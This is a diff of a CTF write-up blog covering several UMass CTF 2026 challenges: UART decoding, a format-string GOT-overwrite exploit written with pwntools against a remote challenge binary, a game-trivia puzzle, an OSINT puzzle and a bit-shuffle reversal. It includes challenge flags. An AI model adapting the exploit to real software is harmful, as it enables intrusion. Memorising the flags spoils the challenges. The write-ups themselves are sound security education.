+\approx \frac{1}{2.996 \times 10^{-5}} \approx 33377 \text{
+baud}\]</span> However, looking at the sample counts, the transitions
+align perfectly with the sample intervals, suggesting the data was
+sampled exactly at the bit rate (1 sample per bit).</li>
+</ul>
+<h3 id="solution">Solution</h3>
+<p>Based on <strong>Hint 3 (UART, 8N1)</strong>: - <strong>Start
+Bit:</strong> A falling edge (<code>1</code> to <code>0</code>). -
+<strong>Data Bits:</strong> 8 bits following the start bit (Least
+Significant Bit first). - <strong>Stop Bit:</strong> 1 bit of high level
+(<code>1</code>).</p>
+<p>By implementing a Python script to parse these transitions, we can
+extract the byte stream:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;code.csv&#x27;</span>)</span><br><span class="line">levels = df[<span class="string">&#x27;logic_level&#x27;</span>].values</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">decoded = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(levels):</span><br><span class="line">    <span class="keyword">if</span> levels[i] == <span class="number">1</span>: <span class="comment"># Wait for start bit</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i + <span class="number">9</span> &gt;= <span class="built_in">len</span>(levels): <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 8 data bits (LSB first)</span></span><br><span class="line">    byte_val = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bit_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> levels[i + <span class="number">1</span> + bit_idx]:</span><br><span class="line">            byte_val |= (<span class="number">1</span> &lt;&lt; bit_idx)</span><br><span class="line">    decoded.append(byte_val)</span><br><span class="line">    i += <span class="number">10</span> <span class="comment"># Move past start + 8 data + 1 stop bit</span></span><br></pre></td></tr></table></figure>
+<p>The decoded output reveals a Linux kernel boot log. Searching through
+the log, a specific line stands out:
+<code>[ 0.037500] secretflag: 554d4153537b553452375f31355f3768335f623335372c5f72316768373f7d</code></p>
+<p>Converting this Hex string to ASCII:
+<code>55 4d 41 53 53 7b 55 34 52 37 5f 31 35 5f 37 68 33 5f 62 33 35 37 2c 5f 72 31 67 68 37 3f 7d</code>
+<span class="math inline">\(\rightarrow\)</span>
+<code>UMASS&#123;U4R7_15_7h3_b357,_r1gh7?&#125;</code></p>
+<h3 id="flag">Flag</h3>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{U4R7_15_7h3_b357,_r1gh7?}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1294,537 +2133,6 @@ grants access to the dashboard and reveals the flag.</p></li>
 </ol>
 <h3 id="flag">Flag</h3>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umass2026/umassctf2026-brick-city-office-space/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/umass2026/umassctf2026-brick-city-office-space/" class="post-title-link" itemprop="url">UMass CTF 2026 - Brick City Office Space</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-04-13 18:08:35 / Modified: 19:24:05" itemprop="dateCreated datePublished" datetime="2026-04-13T18:08:35+08:00">2026-04-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/umass2026/umassctf2026-brick-city-office-space/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umass2026/umassctf2026-brick-city-office-space/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Help design the office space for Brick City's new skyscraper! read
-flag.txt for design specifications.</p>
-<p><code>nc brick-city-office-space.pwn.ctf.umasscybersec.org 45001</code></p>
-</blockquote>
-<h3 id="enumeration">Enumeration</h3>
-<p>The challenge provides a 32-bit x86 Linux binary with the following
-protections:</p>
-<ul>
-<li><strong>RELRO:</strong> No RELRO (GOT is writable)</li>
-<li><strong>Stack Canary:</strong> No Canary</li>
-<li><strong>NX:</strong> Enabled</li>
-<li><strong>PIE:</strong> Disabled (Loads at
-<code>0x08048000</code>)</li>
-</ul>
-<p>Decompiling the <code>vuln</code> function reveals a clear
-<strong>Format String Vulnerability</strong>:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">result = fgets(format, <span class="number">592</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="built_in">printf</span>(format); <span class="comment">// &lt;--- Vulnerable call</span></span><br></pre></td></tr></table></figure>
-<p>The program allows multiple "redesigns," enabling us to trigger the
-vulnerability several times in a single session. By sending
-<code>AAAA %p %p %p %p</code>, we confirm the format string offset is
-<strong>4</strong>.</p>
-<h3 id="exploitation-strategy">Exploitation Strategy</h3>
-<p>Since the binary has No RELRO and PIE is disabled, we can perform a
-standard GOT overwrite:</p>
-<ol type="1">
-<li><strong>Leak Libc:</strong> Use the first <code>printf</code> to
-leak a libc address from the GOT (e.g., <code>printf@GOT</code>).</li>
-<li><strong>Calculate Offsets:</strong> Determine the base address of
-libc and the absolute address of <code>system</code>.</li>
-<li><strong>GOT Overwrite:</strong> Trigger the "redesign" loop and send
-a payload to overwrite <code>printf@GOT</code> with the address of
-<code>system</code>.</li>
-<li><strong>Trigger Shell:</strong> Send the string
-<code>cat flag.txt</code> in the next iteration.
-<code>printf(format)</code> will execute
-<code>system("cat flag.txt")</code>.</li>
-</ol>
-<h3 id="solution">Solution</h3>
-<p>The following exploit uses <code>pwntools</code> to automate the
-process, carefully avoiding backticks (<code>`</code>) which the binary
-handles specially.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./BrickCityOfficeSpace&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;brick-city-office-space.pwn.ctf.umasscybersec.org&#x27;</span>, <span class="number">45001</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">4</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Leak libc</span></span><br><span class="line">payload = p32(printf_got) + <span class="string">b&quot;|%4$s|&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;BrickCityOfficeSpace&gt;&quot;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line">leaked_printf = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc.address = leaked_printf - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Overwrite GOT</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;(y/n)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line"><span class="comment"># Avoid backticks (0x60) by adjusting the number of bytes written</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got: libc.symbols[<span class="string">&#x27;system&#x27;</span>]&#125;, numbwritten=<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;BrickCityOfficeSpace&gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Trigger system(&quot;cat flag.txt&quot;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;(y/n)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;BrickCityOfficeSpace&gt;&quot;</span>, <span class="string">b&quot;cat flag.txt&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="flag">Flag</h3>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{th3-f0rm4t_15-0ff-th3-ch4rt5}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umass2026/umassctf2026-son-of-a-sith/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/umass2026/umassctf2026-son-of-a-sith/" class="post-title-link" itemprop="url">UMass CTF 2026 - Son of a Sith...</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-04-13 14:15:20 / Modified: 14:21:45" itemprop="dateCreated datePublished" datetime="2026-04-13T14:15:20+08:00">2026-04-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/umass2026/umassctf2026-son-of-a-sith/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umass2026/umassctf2026-son-of-a-sith/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Hopefully I can track down this red brick, because if there’s one
-thing I know, it’s that I hate sand. Flag format
-UMASS{What_The_Red_Brick_Does}, eg UMASS{Ground_Pound}</p>
-</blockquote>
-<h3 id="initial-analysis">Initial Analysis</h3>
-<p>The challenge description provides several key clues:</p>
-<ul>
-<li><strong>"Son of a Sith..."</strong>: A direct reference to Darth
-Vader/Anakin Skywalker.</li>
-<li><strong>"I hate sand"</strong>: A famous quote by Anakin Skywalker
-from <em>Star Wars: Episode II – Attack of the Clones</em>, strongly
-associating the location with the desert planet
-<strong>Tatooine</strong>.</li>
-<li><strong>"Red Brick"</strong>: A collectible item from the LEGO Star
-Wars video games used to unlock "Extras".</li>
-<li><strong>Visual Clues</strong>: The provided image shows a LEGO Darth
-Vader in a canyon environment (Jundland Wastes) with a floating Red
-Brick.</li>
-</ul>
-<h3 id="solution">Solution</h3>
-<h4 id="game-identification">1. Game Identification</h4>
-<p>The low-poly aesthetic and the physical presence of a "Red Brick"
-(rather than the "Datacards" used in the 2022 <em>Skywalker Saga</em>)
-point to the classic games developed by TT Games, specifically
-<strong><em>LEGO Star Wars: The Complete Saga</em></strong> or
-<strong><em>LEGO Star Wars II: The Original Trilogy</em></strong>.</p>
-<h4 id="location-level">2. Location &amp; Level</h4>
-<p>The quote "I hate sand" and the environment confirm the setting as
-Tatooine. Specifically, the visual matches <strong>Episode IV, Chapter
-2: "Through the Jundland Wastes"</strong>.</p>
-<h4 id="red-brick-function">3. Red Brick Function</h4>
-<p>In <em>LEGO Star Wars: The Complete Saga</em>, the Red Brick found in
-the "Through the Jundland Wastes" level is located in a hidden area
-accessible in Free Play mode. Collecting this brick unlocks a specific
-"Extra" in the Cantina.</p>
-<p>Researching the collectibles for this specific level reveals that the
-Red Brick unlocks the <strong>Fast Force</strong> ability, which speeds
-up the animation for Jedi and Sith characters using the Force on
-objects.</p>
-<h3 id="flag">Flag</h3>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{Fast_Force}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umass2026/umassctf2026-high-performance/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/umass2026/umassctf2026-high-performance/" class="post-title-link" itemprop="url">UMass CTF 2026 - High Performance</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-04-13 14:06:19 / Modified: 14:13:24" itemprop="dateCreated datePublished" datetime="2026-04-13T14:06:19+08:00">2026-04-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/umass2026/umassctf2026-high-performance/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umass2026/umassctf2026-high-performance/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>I've heard there's a computer shop in the area that sells a computer
-that isn't designed to run Windows, macOS, or Linux. What's the
-processor that's in their flagship, PCIe-capable system? Flag format:
-UMASS{Name of Processor}, i.e. UMASS{AMD Ryzen 7 9800X3D}</p>
-</blockquote>
-<h3 id="initial-analysis">Initial Analysis</h3>
-<p>This OSINT challenge asks for the processor of a flagship,
-PCIe-capable computer system sold by a shop that specializes in hardware
-not intended for mainstream operating systems like Windows, macOS, or
-Linux.</p>
-<p>Key clues: - Non-mainstream OS (Windows, macOS, Linux excluded). -
-Flagship, PCIe-capable system. - Computer shop in a specific "area"
-(implied by the context of previous challenges or search).</p>
-<h3 id="solution">Solution</h3>
-<p>Locate Luxembourg Frence first through picture.</p>
-<p>By researching specialized computer shops, we identified <strong>AAA
-Technology Sàrl</strong> in Dudelange, Luxembourg. They are well-known
-for selling <strong>Amiga</strong> compatible hardware, which runs
-AmigaOS rather than Windows or Linux.</p>
-<p>Their flagship PCIe-capable system is the <strong>AmigaOne</strong>
-series. Investigation into the technical specifications of their
-flagship systems and Amiga platform revealed that the processor used is
-the <strong>NXP QorIQ P1022</strong>.</p>
-<h3 id="flag">Flag</h3>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{NXP QorIQ P1022}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umass2026/umassctf2026-the-accursed-lego-bin/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/umass2026/umassctf2026-the-accursed-lego-bin/" class="post-title-link" itemprop="url">UMass CTF 2026 - The Accursed Lego Bin</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-04-13 14:02:43 / Modified: 14:02:45" itemprop="dateCreated datePublished" datetime="2026-04-13T14:02:43+08:00">2026-04-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/umass2026/umassctf2026-the-accursed-lego-bin/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umass2026/umassctf2026-the-accursed-lego-bin/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>I dropped my message into the bin of Legos. It's all scrambled up
-now. Please help.</p>
-</blockquote>
-<h3 id="initial-analysis">Initial Analysis</h3>
-<p>The challenge provides a Python script <code>encoder.py</code> and
-its corresponding output <code>output.txt</code>. The goal is to recover
-a flag that has had its bits scrambled based on a seed derived from a
-hardcoded string.</p>
-<h4 id="seed-generation">Seed Generation</h4>
-<p>The script uses RSA to "encrypt" the string
-<code>"I_LOVE_RNG"</code>:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&quot;I_LOVE_RNG&quot;</span></span><br><span class="line">n, seed = RSA_enc(text)</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">enc_seed = <span class="built_in">pow</span>(seed, e, n)</span><br></pre></td></tr></table></figure>
-<p>The <code>RSA_enc</code> function calculates
-<code>seed = pow(plain_num, e, n)</code>. In the <code>main</code>
-function, it then calculates <code>enc_seed = pow(seed, e, n)</code>.
-Since <span class="math inline">\(e=7\)</span> is very small and the
-plaintext <code>"I_LOVE_RNG"</code> is short, the value <span
-class="math inline">\(m^e\)</span> (where <span
-class="math inline">\(m\)</span> is the integer representation of the
-text) is much smaller than the 4096-bit RSA modulus <span
-class="math inline">\(n\)</span>. This means <code>pow(m, e, n)</code>
-is simply <span class="math inline">\(m^e\)</span> without any modular
-reduction.</p>
-<h4 id="bit-shuffling">Bit Shuffling</h4>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag_bits = get_flag_bits(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    random.seed(seed*(i+<span class="number">1</span>))</span><br><span class="line">    random.shuffle(flag_bits)</span><br></pre></td></tr></table></figure>
-<p>The flag is converted into a list of bits and shuffled 10 times using
-Python's <code>random.shuffle</code>. Each shuffle is seeded with a
-value derived from the <code>seed</code> identified above.</p>
-<h3 id="solution">Solution</h3>
-<p>To recover the flag, we follow these steps:</p>
-<ol type="1">
-<li><strong>Recover the Seed:</strong> Calculate the integer value of
-<code>"I_LOVE_RNG"</code> and raise it to the 7th power to get the
-<code>seed</code>. We can verify this against <code>enc_seed</code> in
-the output file by checking if <code>seed**7 == enc_seed</code>.</li>
-<li><strong>Reverse the Shuffle:</strong> Since
-<code>random.shuffle</code> is deterministic when the seed is known, we
-can track how the positions change. Instead of shuffling the bits
-directly, we shuffle a list of indices
-<code>[0, 1, 2, ..., len(bits)-1]</code>.</li>
-<li><strong>Reconstruct the Flag:</strong> After 10 shuffles, the index
-list tells us where each original bit ended up. We map the bits from the
-encoded flag back to their original positions and convert the bit array
-back into a string.</li>
-</ol>
-<h4 id="solution-script">Solution Script</h4>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag_bits</span>(<span class="params">flag_hex</span>):</span><br><span class="line">    flag_bytes = <span class="built_in">bytes</span>.fromhex(flag_hex)</span><br><span class="line">    bits = []</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> flag_bytes:</span><br><span class="line">        bits.extend(<span class="built_in">list</span>(<span class="built_in">bin</span>(b)[<span class="number">2</span>:].zfill(<span class="number">8</span>)))</span><br><span class="line">    <span class="keyword">return</span> bits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bit_arr_to_str</span>(<span class="params">bit_arr</span>):</span><br><span class="line">    byte_arr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bit_arr), <span class="number">8</span>):</span><br><span class="line">        byte = bit_arr[i:i+<span class="number">8</span>]</span><br><span class="line">        char = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(byte), <span class="number">2</span>)</span><br><span class="line">        byte_arr.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(byte_arr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Values from output.txt</span></span><br><span class="line">enc_flag_hex = <span class="string">&quot;a9fa3c5e51d4cea498554399848ad14aa0764e15a6a2110b6613f5dc87fa70f17fafbba7eb5a2a5179&quot;</span></span><br><span class="line">text = <span class="string">&quot;I_LOVE_RNG&quot;</span></span><br><span class="line">plain_num = <span class="built_in">int</span>.from_bytes(text.encode(), <span class="string">&quot;big&quot;</span>)</span><br><span class="line">seed = plain_num ** <span class="number">7</span></span><br><span class="line"></span><br><span class="line">flag_bits_enc = get_flag_bits(enc_flag_hex)</span><br><span class="line">num_bits = <span class="built_in">len</span>(flag_bits_enc)</span><br><span class="line">indices = <span class="built_in">list</span>(<span class="built_in">range</span>(num_bits))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replay the shuffle on the indices</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    random.seed(seed * (i + <span class="number">1</span>))</span><br><span class="line">    random.shuffle(indices)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Map scrambled bits back to original positions</span></span><br><span class="line">flag_bits_orig = [<span class="literal">None</span>] * num_bits</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_bits):</span><br><span class="line">    flag_bits_orig[indices[j]] = flag_bits_enc[j]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bit_arr_to_str(flag_bits_orig).decode())</span><br></pre></td></tr></table></figure>
-<h3 id="flag">Flag</h3>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{tH4Nk5_f0R_uN5CR4m8L1nG_mY_M3554g3}</span></span>
 
       
     </div>
